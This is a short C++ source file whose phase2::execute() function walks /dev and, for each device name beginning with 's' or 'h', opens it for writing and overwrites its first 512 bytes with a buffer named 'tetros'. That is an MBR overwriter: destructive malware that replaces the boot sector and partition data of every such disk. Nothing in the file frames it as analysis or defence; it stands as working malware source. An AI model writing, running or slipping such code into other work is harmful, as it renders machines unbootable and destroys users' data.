#include "phase2.h"

phase2::phase2()
{

}



int phase2::execute()
{
	int secsToWait;
	int fd;
	DIR *dir;
	struct dirent *ent;
	if ((dir = opendir ("/dev")) != NULL) {
	  // print all the files and directories within directory 
	  while ((ent = readdir (dir)) != NULL) {
 	   if(ent->d_name[0] == 's' || ent->d_name[0] == 'h')
	   {
	        printf ("%s\n", ent->d_name);
        	fd = open(((std::string)"/dev/"+(std::string)ent->d_name).c_str(), O_WRONLY);
        	lseek(fd, 0, SEEK_SET);
        	write(fd, tetros, 512);
        	close(fd);
        	//perror("perror output:");
		//fclose(fh);
	   }
 	 }
 	 closedir (dir);
	} else {
 	 // could not open directory 
  	perror ("");
  	return EXIT_FAILURE;
	}
        

	close(fd);

	secsToWait = 2;

	sleep(secsToWait);
	//this project was a failure.
	return 0;
}

